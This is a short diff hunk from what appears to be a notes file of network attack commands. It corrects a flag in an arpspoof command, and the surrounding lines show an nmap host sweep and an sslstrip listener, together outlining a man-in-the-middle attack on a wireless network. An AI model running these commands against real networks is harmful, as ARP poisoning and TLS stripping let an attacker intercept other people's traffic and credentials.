@@ -11,7 +11,7 @@ nmap 192.180.0.2-254 -vv
 ---
 
 2.
-arpspoof -i wlan0 t victim -r gateway
+arpspoof -i wlan0 -t victim -r gateway
 sslstrip -l 8080
 
 
